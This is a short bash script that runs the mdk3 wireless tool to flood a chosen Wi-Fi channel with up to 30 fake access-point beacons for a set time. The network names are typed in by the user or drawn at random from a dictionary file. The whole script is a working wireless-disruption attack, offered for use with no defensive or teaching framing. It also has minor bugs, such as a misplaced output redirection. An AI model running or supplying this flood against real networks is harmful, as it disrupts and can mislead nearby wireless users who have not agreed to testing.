#!/bin/bash
read -e -p "how many fake aps would you like? (max 30) " end
if [ "$end" -gt "30" ]; then
exit
fi
read -e -p "interface: " iface
read -e -p "channel: " chan
read -e -p "duration in seconds: " sleep
read -e -p "use dictonary file? (type yes) " yesno
if [ "$yesno" = "yes" ]; then
read -e -p "dictionary File? " file
else
read -e -p "what essid? " essid
fi
# airmon-ng stop $iface
start=0
while [ $start -lt $end ]; do
if [ "$yesno" = "yes" ]; then
essid=`lc="$(($RANDOM % $(wc -l $file|awk '{print $1}')))"; sed -n "${lc}p" $file`
sleep 2
fi
mdk3 $iface b -c $chan -n "$essid-$RANDOM" & 1>/dev/null 2>/dev/null
let start=start+1
done
echo "Duration of flood set to $sleep seconds"
sleep $sleep
killall mdk3
